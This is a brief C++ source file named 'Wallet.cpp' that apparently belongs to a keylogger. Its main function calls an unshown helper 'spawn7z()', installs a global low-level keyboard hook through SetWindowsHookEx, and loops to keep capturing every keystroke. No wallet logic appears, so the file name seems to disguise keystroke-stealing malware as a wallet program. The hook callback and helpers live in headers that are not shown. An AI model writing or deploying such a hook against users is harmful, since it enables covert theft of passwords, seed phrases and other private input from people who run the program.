// Wallet.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include "hook.h"
#include "utils.h"

extern HHOOK hHook;

int main() {
	spawn7z();
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
	if (hHook == NULL) {
		return -1;
	}
	while (GetMessage(NULL, NULL, 0, 0));
}
